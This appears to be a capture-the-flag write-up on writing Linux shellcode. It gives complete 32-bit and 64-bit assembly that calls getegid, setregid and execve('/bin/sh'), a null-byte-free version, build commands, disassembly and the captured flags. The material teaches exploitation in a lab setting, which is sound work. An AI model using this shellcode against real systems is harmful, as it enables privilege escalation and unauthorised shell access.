- [Writing Shellcode](#writing-shellcode)
  - [Compiling](#compiling)
- [Simple Shellcode](#simple-shellcode)
  - [shellcode-32](#shellcode-32)
    - [Full Script + Solve](#full-script--solve)
  - [shellcode-64](#shellcode-64)
    - [Full Script + Solve](#full-script--solve-1)
 
# Writing Shellcode
This is going to be an overview of a handful of the shellcode-based challenges
rather than for just one, as they're similar and more of a stepping stone to 
controlling processes than the be-all and end-all. 

The general goal of these challenges is to write shellcode to
result in the following:
```c
int egid = getegid();
setregid(egid, egid);
execve('/bin/sh', 0, 0);
```

Each challenge generally had a 32bit and 64bit version, denoted by the numbers
on the end of the challenge name. 

## Compiling
```make
make 32:
        gcc -m32 -c -o shellcode.o shellcode.S && \
        gcc -o shellcode shellcode.o -m32 && \
        objcopy -S -O binary -j .text shellcode.o shellcode.bin

make 64:
        gcc -m64 -c -o shellcode.o shellcode.S && \
        gcc -o shellcode shellcode.o -m64 && \
        objcopy -S -O binary -j .text shellcode.o shellcode.bin
```

The binary took `shellcode.bin` and used it to run our code, and then we had a privileged shell
that would allow us to get the flag. 

# Simple Shellcode
For these challenges, we just had to write any shellcode that would accomplish the goal. 
All this required was the general system call calling conventions. 

## shellcode-32
The first call is the easiest as it doesn't have any arguments. We just have to get the 
call number into `%eax` and then use `int 0x80` to make the call. 

```gas
#include <sys/syscall.h>

.globl main
.type main, @function

#include <sys/syscall.h>

.globl main
.type main, @function

main:
    // getegid()
    mov $SYS_getegid, %eax
    int $0x80
```

When calling `setregid()` we have to pass the result of the previous call as
arguments. In IE32 the first few arguments are passed in `%ebx`, `%ecx`, and `%edx`. As usual, the
result of the previous call is in `%eax`. 

```gas
    // setregid(getegid(), getegid())
    mov %eax, %ebx
    mov %eax, %ecx
    mov $SYS_setregid, %eax
    int $0x80
```

When calling `execve` we need to input our string. To do this, the string has to be 
somewhere in memory. The easiest way to do that is to push it onto the stack. As we do this,
however, we need to keep in mind the length of the string. We push 4 bytes onto the stack at
one time, and our string is only 7 bytes. In order to rectify this, we can add an additional 
`/` to the beginning of the string to pad it out to 8 bytes without changing how it will run. 
We also need to push our null byte. 

```gas
    // execve("/bin/sh", 0, 0)
    push $0
    push $0x68732f6e
    push $0x69622f2f
    mov $SYS_execve, %eax
    mov %esp, %ebx
    mov $0, %ecx
    mov $0, %edx
    int $0x80
```

After we compile our code, we can use `strace` to make sure that functions
are being called the way we want them to. 

```
$ strace ./shellcode
...
getegid()                               = 1019
setregid(1019, 1019)                    = 0
execve("//bin/sh", NULL, NULL)          = 0
...
```

### Full Script + Solve
```gas
#include <sys/syscall.h>

.globl main
.type main, @function

main:
    // getegid()
    mov $SYS_getegid, %eax
    int $0x80

    // setregid(getegid(), getegid())
    mov %eax, %ebx
    mov %eax, %ecx
    mov $SYS_setregid, %eax
    int $0x80

    // execve("/bin/sh", 0, 0)
    push $0
    push $0x68732f6e
    push $0x69622f2f
    mov $SYS_execve, %eax
    mov %esp, %ebx
    mov $0, %ecx
    mov $0, %edx
    int $0x80
```
```
$ ./shellcode-32
Reading shellcode from shellcode.bin

$ cat flag
cand{execve_bin_sh}
```

## shellcode-64
The main difference between this challenge and the 32bit challenge is the system call numbers, 
the registers that arguments are passed in, and how the system calls are made. Because we are 
using `<sys/syscall.h>` we can ignore the numbers themselves and just use the variables. The 
arguments are passed in the same registers as in the usual 64bit assembly. And instead of using 
`int 0x80`, we use `syscall`. We also can't directly push variables onto the stack,
so we move them into a register and then push the register. 

### Full Script + Solve
```gas
#include <sys/syscall.h>

.globl main
.type main, @function

main:
    // getegid()
    mov $SYS_getegid, %rax
    syscall

    // setregid(getegid(), getegid())
    mov %rax, %rdi
    mov %rax, %rsi
    mov $SYS_setregid, %rax
    syscall

    // execve("/bin/sh", 0, 0)
    mov $0, %rax
    push %rax
    mov $0x68732f6e69622f2f, %rax
    push %rax
    mov $SYS_execve, %rax
    mov %rsp, %rdi
    mov $0, %rsi
    mov $0, %rdx
    syscall
```
```
$ ./shellcode-64
Reading shellcode from shellcode.bin

$ cat flag
cand{exEcvE_b1n_5h}
```

# Non-Zero Shellcode
Most of the time, you don't want any null-bytes in your shellcode because they get processed
as being the end of a string with functions that take in input. If we look at the bytes of the 
code for shellcode-32, we see lots of null-bytes. 

```
$ objdump -D shellcode.0
objdump -D shellcode.o

shellcode.o:     file format elf32-i386


Disassembly of section .text:

00000000 <main>:
   0:   b8 32 00 00 00          mov    $0x32,%eax
   5:   cd 80                   int    $0x80
   7:   89 c3                   mov    %eax,%ebx
   9:   89 c1                   mov    %eax,%ecx
   b:   b8 47 00 00 00          mov    $0x47,%eax
  10:   cd 80                   int    $0x80
  12:   6a 00                   push   $0x0
  14:   68 6e 2f 73 68          push   $0x68732f6e
  19:   68 2f 2f 62 69          push   $0x69622f2f
  1e:   b8 0b 00 00 00          mov    $0xb,%eax
  23:   89 e3                   mov    %esp,%ebx
  25:   b9 00 00 00 00          mov    $0x0,%ecx
  2a:   ba 00 00 00 00          mov    $0x0,%edx
  2f:   cd 80                   int    $0x80
```

As such, the goal in this set of challenges was to remove all null bytes from 
our compiled code. 

## nonzero-shellcode-32
We can use our code for shellcode-32 as a starting point, and then make adjustments
for how to remove the null bytes. 

The first null bytes we see are in the first line, `mov $0x32, %eax`. This is because it's a 4 
byte move; it automatically expands the single byte `0x32` into the 4 byte `0x00000032`. To get
around this, we can push 0x32 onto the stack and pop it into `%eax`. It will still be expanded to
fill the 4 byte register, but that won't show up in our code. 

```gas
    // getegid()
    push $SYS_getegid
    pop %eax
    int $0x80
```

If we check our compiled code again, we see the zeros are gone. 

```
00000000 <main>:
   0:   6a 32                   push   $0x32
   2:   58                      pop    %eax
   3:   cd 80                   int    $0x80
...
```

The same applies to the `setregid` call. 

```gas
    // setregid(getegid(), getegid())
    mov %eax, %ebx
    mov %eax, %ecx
    push $SYS_setregid
    pop %eax
    int $0x80
```

In order to call `execve` we still need to push our string onto the stack with its null-byte. 
Since we can't push zero directly we can *create* a zero within a register and then push the register. 
While there are multiple ways to do this, the simplest is with `xor`. 

```gas
    xor %eax, %eax
    push %eax
```

Now, we also need to pass zero as arguments, but we can move the same zero we've already created to
do so. Then, we use the push/pop trick from before. 

```gas
    mov %eax, %ecx
    mov %eax, %edx
    push $0x68732f6e
    push $0x69622f2f
    push $SYS_execve
    pop %eax
    mov %esp, %ebx
    int $0x80
```

Now if we look at our compiled code, we don't have any null bytes.

```
00000000 <main>:
   0:   6a 32                   push   $0x32
   2:   58                      pop    %eax
   3:   cd 80                   int    $0x80
   5:   89 c3                   mov    %eax,%ebx
   7:   89 c1                   mov    %eax,%ecx
   9:   6a 47                   push   $0x47
   b:   58                      pop    %eax
   c:   cd 80                   int    $0x80
   e:   31 c0                   xor    %eax,%eax
  10:   50                      push   %eax
  11:   89 c1                   mov    %eax,%ecx
  13:   89 c2                   mov    %eax,%edx
  15:   68 6e 2f 73 68          push   $0x68732f6e
  1a:   68 2f 2f 62 69          push   $0x69622f2f
  1f:   6a 0b                   push   $0xb
  21:   58                      pop    %eax
  22:   89 e3                   mov    %esp,%ebx
  24:   cd 80                   int    $0x80
```

### Full Script + Solve
```gas
#include <sys/syscall.h>

.globl main
.type main, @function

main:
    // getegid()
    push $SYS_getegid
    pop %eax
    int $0x80

    // setregid(getegid(), getegid())
    mov %eax, %ebx
    mov %eax, %ecx
    push $SYS_setregid
    pop %eax
    int $0x80

    // ececve("/bin/sh", 0, 0)
    xor %eax, %eax
    push %eax
    mov %eax, %ecx
    mov %eax, %edx
    push $0x68732f6e
    push $0x69622f2f
    push $SYS_execve
    pop %eax
    mov %esp, %ebx
    int $0x80
```
```
$ ./nonzero-shellcode-32
Reading shellcode from shellcode.bin

$ cat flag
cand{push_aNd_X0R}
```
